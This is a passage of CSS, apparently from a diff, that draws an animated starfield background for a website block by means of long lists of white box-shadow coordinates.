255, 255, 0.70), 1105px 1193px rgba(255, 255, 255, 0.70), 601px 721px rgba(255, 255, 255, 0.70), 601px 1676px rgba(255, 255, 255, 0.70), 880px 935px rgba(255, 255, 255, 0.70), 880px 1890px rgba(255, 255, 255, 0.70), 654px 175px rgba(255, 255, 255, 0.70), 654px 1130px rgba(255, 255, 255, 0.70), 1587px 115px rgba(255, 255, 255, 0.70), 1587px 1070px rgba(255, 255, 255, 0.70), 1891px 216px rgba(255, 255, 255, 0.70), 1891px 1171px rgba(255, 255, 255, 0.70), 565px 69px rgba(255, 255, 255, 0.70), 565px 1024px rgba(255, 255, 255, 0.70), 1828px 474px rgba(255, 255, 255, 0.70), 1828px 1429px rgba(255, 255, 255, 0.70), 1815px 424px rgba(255, 255, 255, 0.70), 1815px 1379px rgba(255, 255, 255, 0.70), 1851px 704px rgba(255, 255, 255, 0.70), 1851px 1659px rgba(255, 255, 255, 0.70), 669px 215px rgba(255, 255, 255, 0.70), 669px 1170px rgba(255, 255, 255, 0.70), 537px 928px rgba(255, 255, 255, 0.70), 537px 1883px rgba(255, 255, 255, 0.70), 1650px 859px rgba(255, 255, 255, 0.70), 1650px 1814px rgba(255, 255, 255, 0.70), 340px 698px rgba(255, 255, 255, 0.70), 340px 1653px rgba(255, 255, 255, 0.70), 376px 78px rgba(255, 255, 255, 0.70), 376px 1033px rgba(255, 255, 255, 0.70), 1422px 150px rgba(255, 255, 255, 0.70), 1422px 1105px rgba(255, 255, 255, 0.70), 1834px 920px rgba(255, 255, 255, 0.70), 1834px 1875px rgba(255, 255, 255, 0.70), 1563px 672px rgba(255, 255, 255, 0.70), 1563px 1627px rgba(255, 255, 255, 0.70), 1445px 680px rgba(255, 255, 255, 0.70), 1445px 1635px rgba(255, 255, 255, 0.70), 483px 626px rgba(255, 255, 255, 0.70), 483px 1581px rgba(255, 255, 255, 0.70), 551px 209px rgba(255, 255, 255, 0.70), 551px 1164px rgba(255, 255, 255, 0.70), 969px 642px rgba(255, 255, 255, 0.70), 969px 1597px rgba(255, 255, 255, 0.70), 1106px 844px rgba(255, 255, 255, 0.70), 1106px 1799px rgba(255, 255, 255, 0.70), 95px 916px rgba(255, 255, 255, 0.70), 95px 1871px rgba(255, 255, 255, 0.70), 673px 405px rgba(255, 255, 255, 0.70), 673px 1360px rgba(255, 255, 255, 0.70), 10px 681px rgba(255, 255, 255, 0.70), 10px 1636px rgba(255, 255, 255, 0.70), 1379px 804px rgba(255, 255, 255, 0.70), 1379px 1759px rgba(255, 255, 255, 0.70), 392px 4px rgba(255, 255, 255, 0.70), 392px 959px rgba(255, 255, 255, 0.70), 1659px 688px rgba(255, 255, 255, 0.70), 1659px 1643px rgba(255, 255, 255, 0.70), 1719px 302px rgba(255, 255, 255, 0.70), 1719px 1257px rgba(255, 255, 255, 0.70), 1283px 169px rgba(255, 255, 255, 0.70), 1283px 1124px rgba(255, 255, 255, 0.70), 980px 323px rgba(255, 255, 255, 0.70), 980px 1278px rgba(255, 255, 255, 0.70), 247px 886px rgba(255, 255, 255, 0.70), 247px 1841px rgba(255, 255, 255, 0.70), 1037px 278px rgba(255, 255, 255, 0.70), 1037px 1233px rgba(255, 255, 255, 0.70), 1643px 534px rgba(255, 255, 255, 0.70), 1643px 1489px rgba(255, 255, 255, 0.70), 1182px 25px rgba(255, 255, 255, 0.70), 1182px 980px rgba(255, 255, 255, 0.70), 1016px 852px rgba(255, 255, 255, 0.70), 1016px 1807px rgba(255, 255, 255, 0.70), 1312px 634px rgba(255, 255, 255, 0.70), 1312px 1589px rgba(255, 255, 255, 0.70), 622px 582px rgba(255, 255, 255, 0.70), 622px 1537px rgba(255, 255, 255, 0.70), 675px 286px rgba(255, 255, 255, 0.70), 675px 1241px rgba(255, 255, 255, 0.70), 1355px 485px rgba(255, 255, 255, 0.70), 1355px 1440px rgba(255, 255, 255, 0.70), 533px 414px rgba(255, 255, 255, 0.70), 533px 1369px rgba(255, 255, 255, 0.70), 1238px 644px rgba(255, 255, 255, 0.70), 1238px 1599px rgba(255, 255, 255, 0.70), 207px 389px rgba(255, 255, 255, 0.70), 207px 1344px rgba(255, 255, 255, 0.70), 302px 715px rgba(255, 255, 255, 0.70), 302px 1670px rgba(255, 255, 255, 0.70), 1511px 594px rgba(255, 255, 255, 0.70), 1511px 1549px rgba(255, 255, 255, 0.70), 1453px 445px rgba(255, 255, 255, 0.70), 1453px 1400px rgba(255, 255, 255, 0.70), 1141px 61px rgba(255, 255, 255, 0.70), 1141px 1016px rgba(255, 255, 255, 0.70), 477px 139px rgba(255, 255, 255, 0.70), 477px 1094px rgba(255, 255, 255, 0.70), 165px 9px rgba(255, 255, 255, 0.70), 165px 964px rgba(255, 255, 255, 0.70), 1557px 17px rgba(255, 255, 255, 0.70), 1557px 972px rgba(255, 255, 255, 0.70), 1239px 650px rgba(255, 255, 255, 0.70), 1239px 1605px rgba(255, 255, 255, 0.70);
+                    animation-duration: 48s;
+                    animation-name: t826__galaxy-rec79851894
+                }
+
+                .t826__galaxy-mid-rec79851894:after {
+                    content: ' ';
+                    position: absolute;
+                    top: 955px
+                }
+
+                .t826__galaxy-far-rec79851894:after,
+                .t826__galaxy-far-rec79851894 {
+                    box-shadow: 173px 865px rgba(255, 255, 255, 0.70), 1164px 134px rgba(255, 255, 255, 0.70), 1164px 1089px rgba(255, 255, 255, 0.70), 1103px 137px rgba(255, 255, 255, 0.70), 1103px 1092px rgba(255, 255, 255, 0.70), 112px 818px rgba(255, 255, 255, 0.70), 112px 1773px rgba(255, 255, 255, 0.70), 247px 53px rgba(255, 255, 255, 0.70), 247px 1008px rgba(255, 255, 255, 0.70), 1603px 453px rgba(255, 255, 255, 0.70), 1603px 1408px rgba(255, 255, 255, 0.70), 1242px 506px rgba(255, 255, 255, 0.70), 1242px 1461px rgba(255, 255, 255, 0.70), 1164px 788px rgba(255, 255, 255, 0.70), 1164px 1743px rgba(255, 255, 255, 0.70), 941px 74px rgba(255, 255, 255, 0.70), 941px 1029px rgba(255, 255, 255, 0.70), 954px 936px rgba(255, 255, 255, 0.70), 954px 1891px rgba(255, 255, 255, 0.70), 772px 936px rgba(255, 255, 255, 0.70), 772px 1891px rgba(255, 255, 255, 0.70), 197px 611px rgba(255, 255, 255, 0.70), 197px 1566px rgba(255, 255, 255, 0.70), 8px 93px rgba(255, 255, 255, 0.70), 8px 1048px rgba(255, 255, 255, 0.70), 1269px 541px rgba(255, 255, 255, 0.70), 1269px 1496px rgba(255, 255, 255, 0.70), 711px 107px rgba(255, 255, 255, 0.70), 711px 1062px rgba(255, 255, 255, 0.70), 1503px 315px rgba(255, 255, 255, 0.70), 1503px 1270px rgba(255, 255, 255, 0.70), 1612px 479px rgba(255, 255, 255, 0.70), 1612px 1434px rgba(255, 255, 255, 0.70), 752px 455px rgba(255, 255, 255, 0.70), 752px 1410px rgba(255, 255, 255, 0.70), 304px 836px rgba(255, 255, 255, 0.70), 304px 1791px rgba(255, 255, 255, 0.70), 160px 261px rgba(255, 255, 255, 0.70), 160px 1216px rgba(255, 255, 255, 0.70), 1033px 908px rgba(255, 255, 255, 0.70), 1033px 1863px rgba(255, 255, 255, 0.70), 56px 410px rgba(255, 255, 255, 0.70), 56px 1365px rgba(255, 255, 255, 0.70), 502px 823px rgba(255, 255, 255, 0.70), 502px 1778px rgba(255, 255, 255, 0.70), 177px 124px rgba(255, 255, 255, 0.70), 177px 1079px rgba(255, 255, 255, 0.70), 993px 505px rgba(255, 255, 255, 0.70), 993px 1460px rgba(255, 255, 255, 0.70), 997px 687px rgba(255, 255, 255, 0.70), 997px 1642px rgba(255, 255, 255, 0.70), 557px 882px rgba(255, 255, 255, 0.70), 557px 1837px rgba(255, 255, 255, 0.70), 1829px 356px rgba(255, 255, 255, 0.70), 1829px 1311px rgba(255, 255, 255, 0.70), 567px 480px rgba(255, 255, 255, 0.70), 567px 1435px rgba(255, 255, 255, 0.70), 54px 920px rgba(255, 255, 255, 0.70), 54px 1875px rgba(255, 255, 255, 0.70), 175px 166px rgba(255, 255, 255, 0.70), 175px 1121px rgba(255, 255, 255, 0.70), 1853px 721px rgba(255, 255, 255, 0.70), 1853px 1676px rgba(255, 255, 255, 0.70), 1723px 146px rgba(255, 255, 255, 0.70), 1723px 1101px rgba(255, 255, 255, 0.70), 1128px 951px rgba(255, 255, 255, 0.70), 1128px 1906px rgba(255, 255, 255, 0.70), 227px 593px rgba(255, 255, 255, 0.70), 227px 1548px rgba(255, 255, 255, 0.70), 171px 27px rgba(255, 255, 255, 0.70), 171px 982px rgba(255, 255, 255, 0.70), 1076px 781px rgba(255, 255, 255, 0.70), 1076px 1736px rgba(255, 255, 255, 0.70), 342px 431px rgba(255, 255, 255, 0.70), 342px 1386px rgba(255, 255, 255, 0.70), 827px 378px rgba(255, 255, 255, 0.70), 827px 1333px rgba(255, 255, 255, 0.70), 1794px 88px rgba(255, 255, 255, 0.70), 1794px 1043px rgba(255, 255, 255, 0.70), 212px 398px rgba(255, 255, 255, 0.70), 212px 1353px rgba(255, 255, 255, 0.70), 1679px 394px rgba(255, 255, 255, 0.70), 1679px 1349px rgba(255, 255, 255, 0.70), 1483px 182px rgba(255, 255, 255, 0.70), 1483px 1137px rgba(255, 255, 255, 0.70), 145px 647px rgba(255, 255, 255, 0.70), 145px 1602px rgba(255, 255, 255, 0.70), 1546px 530px rgba(255, 255, 255, 0.70), 1546px 1485px rgba(255, 255, 255, 0.70), 821px 463px rgba(255, 255, 255, 0.70), 821px 1418px rgba(255, 255, 255, 0.70), 126px 141px rgba(255, 255, 255, 0.70), 126px 1096px rgba(255, 255, 255, 0.70), 1844px 82px rgba(255, 255, 255, 0.70), 1844px 1037px rgba(255, 255, 255, 0.70), 1047px 235px rgba(255, 255, 255, 0.70), 1047px 1190px rgba(255, 255, 255, 0.70), 1525px 7px rgba(255, 255, 255, 0.70), 1525px 962px rgba(255, 255, 255, 0.70), 528px 882px rgba(255, 255, 255, 0.70), 528px 1837px rgba(255, 255, 255, 0.70), 1898px 778px rgba(255, 255, 255, 0.70), 1898px 1733px rgba(255, 255, 255, 0.70), 1172px 918px rgba(255, 255, 255, 0.70), 1172px 1873px rgba(255, 255, 255, 0.70), 786px 265px rgba(255, 255, 255, 0.70), 786px 1220px rgba(255, 255, 255, 0.70), 1417px 10px rgba(255, 255, 255, 0.70), 1417px 965px rgba(255, 255, 255, 0.70), 1002px 523px rgba(255, 255, 255, 0.70), 1002px 1478px rgba(255, 255, 255, 0.70), 1874px 120px rgba(255, 255, 255, 0.70), 1874px 1075px rgba(255, 255, 255, 0.70), 112px 660px rgba(255, 255, 255, 0.70), 112px 1615px rgba(255, 255, 255, 0.70), 612px 231px rgba(255, 255, 255, 0.70), 612px 1186px rgba(255, 255, 255, 0.70), 353px 323px rgba(255, 255, 255, 0.70), 353px 1278px rgba(255, 255, 255, 0.70), 1109px 462px rgba(255, 255, 255, 0.70), 1109px 1417px rgba(255, 255, 255, 0.70), 1020px 182px rgba(255, 255, 255, 0.70), 1020px 1137px rgba(255, 255, 255, 0.70), 848px 680px rgba(255, 255, 255, 0.70), 848px 1635px rgba(255, 255, 255, 0.70), 1619px 446px rgba(255, 255, 255, 0.70), 1619px 1401px rgba(255, 255, 255, 0.70), 972px 327px rgba(255, 255, 255, 0.70), 972px 1282px rgba(255, 255, 255, 0.70), 125px 257px rgba(255, 255, 255, 0.70), 125px 1212px rgba(255, 255, 255, 0.70), 280px 612px rgba(255, 255, 255, 0.70), 280px 1567px rgba(255, 255, 255, 0.70), 359px 913px rgba(255, 255, 255, 0.70), 359px 1868px rgba(255, 255, 255, 0.70), 1554px 42px rgba(255, 255, 255, 0.70), 1554px 997px rgba(255, 255, 255, 0.70), 638px 419px rgba(255, 255, 255, 0.70), 638px 1374px rgba(255, 255, 255, 0.70), 803px 611px rgba(255, 255, 255, 0.70), 803px 1566px rgba(255, 255, 255, 0.70), 67px 116px rgba(255, 255, 255, 0.70), 67px 1071px rgba(255, 255, 255, 0.70), 179px 944px rgba(255, 255, 255, 0.70), 179px 1899px rgba(255, 255, 255, 0.70), 639px 65px rgba(255, 255, 255, 0.70), 639px 1020px rgba(255, 255, 255, 0.70), 642px 131px rgba(255, 255, 255, 0.70), 642px 1086px rgba(255, 255, 255, 0.70), 1096px 875px rgba(255, 255, 255, 0.70), 1096px 1830px rgba(255, 255, 255, 0.70), 1188px 39px rgba(255, 255, 255, 0.70), 1188px 994px rgba(255, 255, 255, 0.70), 1336px 557px rgba(255, 255, 255, 0.70), 1336px 1512px rgba(255, 255, 255, 0.70), 1581px 511px rgba(255, 255, 255, 0.70), 1581px 1466px rgba(255, 255, 255, 0.70), 161px 189px rgba(255, 255, 255, 0.70), 161px 1144px rgba(255, 255, 255, 0.70), 115px 465px rgba(255, 255, 255, 0.70), 115px 1420px rgba(255, 255, 255, 0.70), 659px 124px rgba(255, 255, 255, 0.70), 659px 1079px rgba(255, 255, 255, 0.70), 1666px 445px rgba(255, 255, 255, 0.70), 1666px 1400px rgba(255, 255, 255, 0.70), 1494px 830px rgba(255, 255, 255, 0.70), 1494px 1785px rgba(255, 255, 255, 0.70), 1341px 815px rgba(255, 255, 255, 0.70), 1341px 1770px rgba(255, 255, 255, 0.70), 1684px 64px rgba(255, 255, 255, 0.70), 1684px 1019px rgba(255, 255, 255, 0.70), 906px 197px rgba(255, 255, 255, 0.70), 906px 1152px rgba(255, 255, 255, 0.70), 1248px 63px rgba(255, 255, 255, 0.70), 1248px 1018px rgba(255, 255, 255, 0.70), 433px 558px rgba(255, 255, 255, 0.70), 433px 1513px rgba(255, 255, 255, 0.70), 680px 374px rgba(255, 255, 255, 0.70), 680px 1329px rgba(255, 255, 255, 0.70), 580px 181px rgba(255, 255, 255, 0.70), 580px 1136px rgba(255, 255, 255, 0.70), 417px 851px rgba(255, 255, 255, 0.70), 417px 1806px rgba(255, 255, 255, 0.70), 695px 879px rgba(255, 255, 255, 0.70), 695px 1834px rgba(255, 255, 255, 0.70), 714px 2px rgba(255, 255, 255, 0.70), 714px 957px rgba(255, 255, 255, 0.70), 125px 865px rgba(255, 255, 255, 0.70), 125px 1820px rgba(255, 255, 255, 0.70), 494px 486px rgba(255, 255, 255, 0.70), 494px 1441px rgba(255, 255, 255, 0.70), 1414px 647px rgba(255, 255, 255, 0.70), 1414px 1602px rgba(255, 255, 255, 0.70), 877px 487px rgba(255, 255, 255, 0.70), 877px 1442px rgba(255, 255, 255, 0.70), 1498px 617px rgba(255, 255, 255, 0.70), 1498px 1572px rgba(255, 255, 255, 0.70), 182px 595px rgba(255, 255, 255, 0.70), 182px 1550px rgba(255, 255, 255, 0.70), 914px 578px rgba(255, 255, 255, 0.70), 914px 1533px rgba(255, 255, 255, 0.70), 485px 788px rgba(255, 255, 255, 0.70), 485px 1743px rgba(255, 255, 255, 0.70), 5px 207px rgba(255, 255, 255, 0.70), 5px 1162px rgba(255, 255, 255, 0.70), 504px 129px rgba(255, 255, 255, 0.70), 504px 1084px rgba(255, 255, 255, 0.70), 25px 108px rgba(255, 255, 255, 0.70), 25px 1063px rgba(255, 255, 255, 0.70), 828px 458px rgba(255, 255, 255, 0.70), 828px 1413px rgba(255, 255, 255, 0.70), 104px 382px rgba(255, 255, 255, 0.70), 104px 1337px rgba(255, 255, 255, 0.70), 955px 109px rgba(255, 255, 255, 0.70), 955px 1064px rgba(255, 255, 255, 0.70), 938px 310px rgba(255, 255, 255, 0.70), 938px 1265px rgba(255, 255, 255, 0.70), 987px 832px rgba(255, 255, 255, 0.70), 987px 1787px rgba(255, 255, 255, 0.70), 173px 693px rgba(255, 255, 255, 0.70), 173px 1648px rgba(255, 255, 255, 0.70), 1795px 45px rgba(255, 255, 255, 0.70), 1795px 1000px rgba(255, 255, 255, 0.70), 263px 36px rgba(255, 255, 255, 0.70), 263px 991px rgba(255, 255, 255, 0.70), 855px 671px rgba(255, 255, 255, 0.70), 855px 1626px rgba(255, 255, 255, 0.70), 587px 189px rgba(255, 255, 255, 0.70), 587px 1144px rgba(255, 255, 255, 0.70), 1577px 437px rgba(255, 255, 255, 0.70), 1577px 1392px rgba(255, 255, 255, 0.70), 1372px 896px rgba(255, 255, 255, 0.70), 1372px 1851px rgba(255, 255, 255, 0.70), 632px 231px rgba(255, 255, 255, 0.70), 632px 1186px rgba(255, 255, 255, 0.70), 562px 0px rgba(255, 255, 255, 0.70), 562px 955px rgba(255, 255, 255, 0.70), 1008px 4px rgba(255, 255, 255, 0.70), 1008px 959px rgba(255, 255, 255, 0.70), 274px 772px rgba(255, 255, 255, 0.70), 274px 1727px rgba(255, 255, 255, 0.70), 909px 399px rgba(255, 255, 255, 0.70), 909px 1354px rgba(255, 255, 255, 0.70), 441px 598px rgba(255, 255, 255, 0.70), 441px 1553px rgba(255, 255, 255, 0.70), 1622px 927px rgba(255, 255, 255, 0.70), 1622px 1882px rgba(255, 255, 255, 0.70), 136px 525px rgba(255, 255, 255, 0.70), 136px 1480px rgba(255, 255, 255, 0.70), 1825px 798px rgba(255, 255, 255, 0.70), 1825px 1753px rgba(255, 255, 255, 0.70), 764px 924px rgba(255, 255, 255, 0.70), 764px 1879px rgba(255, 255, 255, 0.70), 1902px 52px rgba(255, 255, 255, 0.70), 1902px 1007px rgba(255, 255, 255, 0.70), 282px 830px rgba(255, 255, 255, 0.70), 282px 1785px rgba(255, 255, 255, 0.70), 919px 792px rgba(255, 255, 255, 0.70), 919px 1747px rgba(255, 255, 255, 0.70), 336px 78px rgba(255, 255, 255, 0.70), 336px 1033px rgba(255, 255, 255, 0.70), 1858px 4px rgba(255, 255, 255, 0.70), 1858px 959px rgba(255, 255, 255, 0.70), 709px 776px rgba(255, 255, 255, 0.70), 709px 1731px rgba(255, 255, 255, 0.70), 415px 345px rgba(255, 255, 255, 0.70), 415px 1300px rgba(255, 255, 255, 0.70), 1196px 931px rgba(255, 255, 255, 0.70), 1196px 1886px rgba(255, 255, 255, 0.70), 1033px 934px rgba(255, 255, 255, 0.70), 1033px 1889px rgba(255, 255, 255, 0.70), 1864px 867px rgba(255, 255, 255, 0.70), 1864px 1822px rgba(255, 255, 255, 0.70), 1222px 357px rgba(255, 255, 255, 0.70), 1222px 1312px rgba(255, 255, 255, 0.70), 1181px 726px rgba(255, 255, 255, 0.70), 1181px 1681px rgba(255, 255, 255, 0.70), 741px 230px rgba(255, 255, 255, 0.70), 741px 1185px rgba(255, 255, 255, 0.70), 473px 777px rgba(255, 255, 255, 0.70), 473px 1732px rgba(255, 255, 255, 0.70), 991px 480px rgba(255, 255, 255, 0.70), 991px 1435px rgba(255, 255, 255, 0.70), 291px 110px rgba(255, 255, 255, 0.70), 291px 1065px rgba(255, 255, 255, 0.70), 1878px 636px rgba(255, 255, 255, 0.70), 1878px 1591px rgba(255, 255, 255, 0.70), 374px 30px rgba(255, 255, 255, 0.70), 374px 985px rgba(255, 255, 255, 0.70), 1870px 515px rgba(255, 255, 255, 0.70), 1870px 1470px rgba(255, 255, 255, 0.70), 912px 318px rgba(255, 255, 255, 0.70), 912px 1273px rgba(255, 255, 255, 0.70), 184px 527px rgba(255, 255, 255, 0.70), 184px 1482px rgba(255, 255, 255, 0.70), 587px 839px rgba(255, 255, 255, 0.70), 587px 1794px rgba(255, 255, 255, 0.70), 1290px 68px rgba(255, 255, 255, 0.70), 1290px 1023px rgba(255, 255, 255, 0.70), 606px 534px rgba(255, 255, 255, 0.70), 606px 1489px rgba(255, 255, 255, 0.70), 942px 882px rgba(255, 255, 255, 0.70), 942px 1837px rgba(255, 255, 255, 0.70), 5px 276px rgba(255, 255, 255, 0.70), 5px 1231px rgba(255, 255, 255, 0.70), 1218px 859px rgba(255, 255, 255, 0.70), 1218px 1814px rgba(255, 255, 255, 0.70), 1377px 626px rgba(255, 255, 255, 0.70), 1377px 1581px rgba(255, 255, 255, 0.70), 1679px 113px rgba(255, 255, 255, 0.70), 1679px 1068px rgba(255, 255, 255, 0.70), 1822px 903px rgba(255, 255, 255, 0.70), 1822px 1858px rgba(255, 255, 255, 0.70), 1381px 898px rgba(255, 255, 255, 0.70), 1381px 1853px rgba(255, 255, 255, 0.70), 855px 395px rgba(255, 255, 255, 0.70), 855px 1350px rgba(255, 255, 255, 0.70), 1814px 18px rgba(255, 255, 255, 0.70), 1814px 973px rgba(255, 255, 255, 0.70), 72px 57px rgba(255, 255, 255, 0.70), 72px 1012px rgba(255, 255, 255, 0.70), 957px 141px rgba(255, 255, 255, 0.70), 957px 1096px rgba(255, 255, 255, 0.70), 1322px 377px rgba(255, 255, 255, 0.70), 1322px 1332px rgba(255, 255, 255, 0.70), 540px 51px rgba(255, 255, 255, 0.70), 540px 1006px rgba(255, 255, 255, 0.70), 125px 304px rgba(255, 255, 255, 0.70), 125px 1259px rgba(255, 255, 255, 0.70), 1153px 162px rgba(255, 255, 255, 0.70), 1153px 1117px rgba(255, 255, 255, 0.70), 1269px 850px rgba(255, 255, 255, 0.70), 1269px 1805px rgba(255, 255, 255, 0.70), 1817px 524px rgba(255, 255, 255, 0.70), 1817px 1479px rgba(255, 255, 255, 0.70), 1173px 331px rgba(255, 255, 255, 0.70), 1173px 1286px rgba(255, 255, 255, 0.70), 1304px 359px rgba(255, 255, 255, 0.70), 1304px 1314px rgba(255, 255, 255, 0.70), 1056px 114px rgba(255, 255, 255, 0.70), 1056px 1069px rgba(255, 255, 255, 0.70), 1472px 692px rgba(255, 255, 255, 0.70), 1472px 1647px rgba(255, 255, 255, 0.70), 269px 514px rgba(255, 255, 255, 0.70), 269px 1469px rgba(255, 255, 255, 0.70), 780px 184px rgba(255, 255, 255, 0.70), 780px 1139px rgba(255, 255, 255, 0.70), 788px 99px rgba(255, 255, 255, 0.70), 788px 1054px rgba(255, 255, 255, 0.70), 944px 823px rgba(255, 255, 255, 0.70), 944px 1778px rgba(255, 255, 255, 0.70), 27px 89px rgba(255, 255, 255, 0.70), 27px 1044px rgba(255, 255, 255, 0.70), 1748px 52px rgba(255, 255, 255, 0.70), 1748px 1007px rgba(255, 255, 255, 0.70), 1311px 476px rgba(255, 255, 255, 0.70), 1311px 1431px rgba(255, 255, 255, 0.70), 731px 44px rgba(255, 255, 255, 0.70), 731px 999px rgba(255, 255, 255, 0.70), 17px 752px rgba(255, 255, 255, 0.70), 17px 1707px rgba(255, 255, 255, 0.70), 367px 883px rgba(255, 255, 255, 0.70), 367px 1838px rgba(255, 255, 255, 0.70), 744px 419px rgba(255, 255, 255, 0.70), 744px 1374px rgba(255, 255, 255, 0.70), 616px 839px rgba(255, 255, 255, 0.70), 616px 1794px rgba(255, 255, 255, 0.70), 1888px 402px rgba(255, 255, 255, 0.70), 1888px 1357px rgba(255, 255, 255, 0.70), 383px 770px rgba(255, 255, 255, 0.70), 383px 1725px rgba(255, 255, 255, 0.70), 1490px 438px rgba(255, 255, 255, 0.70), 1490px 1393px rgba(255, 255, 255, 0.70), 1362px 848px rgba(255, 255, 255, 0.70), 1362px 1803px rgba(255, 255, 255, 0.70), 1400px 339px rgba(255, 255, 255, 0.70), 1400px 1294px rgba(255, 255, 255, 0.70), 1777px 36px rgba(255, 255, 255, 0.70), 1777px 991px rgba(255, 255, 255, 0.70), 526px 855px rgba(255, 255, 255, 0.70), 526px 1810px rgba(255, 255, 255, 0.70), 1340px 47px rgba(255, 255, 255, 0.70), 1340px 1002px rgba(255, 255, 255, 0.70), 789px 149px rgba(255, 255, 255, 0.70), 789px 1104px rgba(255, 255, 255, 0.70), 1464px 691px rgba(255, 255, 255, 0.70), 1464px 1646px rgba(255, 255, 255, 0.70), 1109px 506px rgba(255, 255, 255, 0.70), 1109px 1461px rgba(255, 255, 255, 0.70), 934px 442px rgba(255, 255, 255, 0.70), 934px 1397px rgba(255, 255, 255, 0.70), 965px 253px rgba(255, 255, 255, 0.70), 965px 1208px rgba(255, 255, 255, 0.70), 1762px 752px rgba(255, 255, 255, 0.70), 1762px 1707px rgba(255, 255, 255, 0.70), 1652px 58px rgba(255, 255, 255, 0.70), 1652px 1013px rgba(255, 255, 255, 0.70), 1266px 492px rgba(255, 255, 255, 0.70), 1266px 1447px rgba(255, 255, 255, 0.70), 1481px 227px rgba(255, 255, 255, 0.70), 1481px 1182px rgba(255, 255, 255, 0.70), 1668px 658px rgba(255, 255, 255, 0.70), 1668px 1613px rgba(255, 255, 255, 0.70), 1567px 128px rgba(255, 255, 255, 0.70), 1567px 1083px rgba(255, 255, 255, 0.70), 786px 169px rgba(255, 255, 255, 0.70), 786px 1124px rgba(255, 255, 255, 0.70), 1610px 659px rgba(255, 255, 255, 0.70), 1610px 1614px rgba(255, 255, 255, 0.70), 1375px 189px rgba(255, 255, 255, 0.70), 1375px 1144px rgba(255, 255, 255, 0.70), 1px 794px rgba(255, 255, 255, 0.70), 1px 1749px rgba(255, 255, 255, 0.70), 1099px 573px rgba(255, 255, 255, 0.70), 1099px 1528px rgba(255, 255, 255, 0.70), 1734px 34px rgba(255, 255, 255, 0.70), 1734px 989px rgba(255, 255, 255, 0.70), 1478px 6px rgba(255, 255, 255, 0.70), 1478px 961px rgba(255, 255, 255, 0.70), 1738px 184px rgba(255, 255, 255, 0.70), 1738px 1139px rgba(255, 255, 255, 0.70), 373px 690px rgba(255, 255, 255, 0.70), 373px 1645px rgba(255, 255, 255, 0.70), 1423px 809px rgba(255, 255, 255, 0.70), 1423px 1764px rgba(255, 255, 255, 0.70), 1755px 570px rgba(255, 255, 255, 0.70), 1755px 1525px rgba(255, 255, 255, 0.70), 1697px 874px rgba(255, 255, 255, 0.70), 1697px 1829px rgba(255, 255, 255, 0.70), 563px 331px rgba(255, 255, 255, 0.70), 563px 1286px rgba(255, 255, 255, 0.70), 257px 542px rgba(255, 255, 255, 0.70), 257px 1497px rgba(255, 255, 255, 0.70), 1715px 477px rgba(255, 255, 255, 0.70), 1715px 1432px rgba(255, 255, 255, 0.70), 1119px 47px rgba(255, 255, 255, 0.70), 1119px 1002px rgba(255, 255, 255, 0.70), 1825px 252px rgba(255, 255, 255, 0.70), 1825px 1207px rgba(255, 255, 255, 0.70), 1415px 943px rgba(255, 255, 255, 0.70), 1415px 1898px rgba(255, 255, 255, 0.70), 46px 920px rgba(255, 255, 255, 0.70), 46px 1875px rgba(255, 255, 255, 0.70), 1234px 822px rgba(255, 255, 255, 0.70), 1234px 1777px rgba(255, 255, 255, 0.70), 690px 938px rgba(255, 255, 255, 0.70), 690px 1893px rgba(255, 255, 255, 0.70), 383px 431px rgba(255, 255, 255, 0.70), 383px 1386px rgba(255, 255, 255, 0.70), 836px 359px rgba(255, 255, 255, 0.70), 836px 1314px rgba(255, 255, 255, 0.70), 974px 762px rgba(255, 255, 255, 0.70), 974px 1717px rgba(255, 255, 255, 0.70), 1600px 454px rgba(255, 255, 255, 0.70), 1600px 1409px rgba(255, 255, 255, 0.70), 1237px 196px rgba(255, 255, 255, 0.70), 1237px 1151px rgba(255, 255, 255, 0.70), 631px 230px rgba(255, 255, 255, 0.70), 631px 1185px rgba(255, 255, 255, 0.70), 450px 699px rgba(255, 255, 255, 0.70), 450px 1654px rgba(255, 255, 255, 0.70), 284px 310px rgba(255, 255, 255, 0.70), 284px 1265px rgba(255, 255, 255, 0.70), 1692px 943px rgba(255, 255, 255, 0.70), 1692px 1898px rgba(255, 255, 255, 0.70), 190px 436px rgba(255, 255, 255, 0.70), 190px 1391px rgba(255, 255, 255, 0.70), 408px 511px rgba(255, 255, 255, 0.70), 408px 1466px rgba(255, 255, 255, 0.70), 1848px 720px rgba(255, 255, 255, 0.70), 1848px 1675px rgba(255, 255, 255, 0.70), 1218px 274px rgba(255, 255, 255, 0.70), 1218px 1229px rgba(255, 255, 255, 0.70), 818px 574px rgba(255, 255, 255, 0.70), 818px 1529px rgba(255, 255, 255, 0.70), 1678px 95px rgba(255, 255, 255, 0.70), 1678px 1050px rgba(255, 255, 255, 0.70), 730px 541px rgba(255, 255, 255, 0.70), 730px 1496px rgba(255, 255, 255, 0.70), 1865px 861px rgba(255, 255, 255, 0.70), 1865px 1816px rgba(255, 255, 255, 0.70), 341px 820px rgba(255, 255, 255, 0.70), 341px 1775px rgba(255, 255, 255, 0.70), 50px 441px rgba(255, 255, 255, 0.70), 50px 1396px rgba(255, 255, 255, 0.70), 664px 497px rgba(255, 255, 255, 0.70), 664px 1452px rgba(255, 255, 255, 0.70), 1737px 11px rgba(255, 255, 255, 0.70), 1737px 966px rgba(255, 255, 255, 0.70), 423px 723px rgba(255, 255, 255, 0.70), 423px 1678px rgba(255, 255, 255, 0.70), 574px 722px rgba(255, 255, 255, 0.70), 574px 1677px rgba(255, 255, 255, 0.70), 1176px 624px rgba(255, 255, 255, 0.70), 1176px 1579px rgba(255, 255, 255, 0.70), 619px 50px rgba(255, 255, 255, 0.70), 619px 1005px rgba(255, 255, 255, 0.70), 1542px 818px rgba(255, 255, 255, 0.70), 1542px 1773px rgba(255, 255, 255, 0.70), 92px 290px rgba(255, 255, 255, 0.70), 92px 1245px rgba(255, 255, 255, 0.70), 31px 931px rgba(255, 255, 255, 0.70), 31px 1886px rgba(255, 255, 255, 0.70), 372px 316px rgba(255, 255, 255, 0.70), 372px 1271px rgba(255, 255, 255, 0.70), 1055px 870px rgba(255, 255, 255, 0.70), 1055px 1825px rgba(255, 255, 255, 0.70), 1214px 681px rgba(255, 255, 255, 0.70), 1214px 1636px rgba(255, 255, 255, 0.70), 1153px 777px rgba(255, 255, 255, 0.70), 1153px 1732px rgba(255, 255, 255, 0.70), 1031px 263px rgba(255, 255, 255, 0.70), 1031px 1218px rgba(255, 255, 255, 0.70), 511px 613px rgba(255, 255, 255, 0.70), 511px 1568px rgba(255, 255, 255, 0.70), 1795px 608px rgba(255, 255, 255, 0.70), 1795px 1563px rgba(255, 255, 255, 0.70), 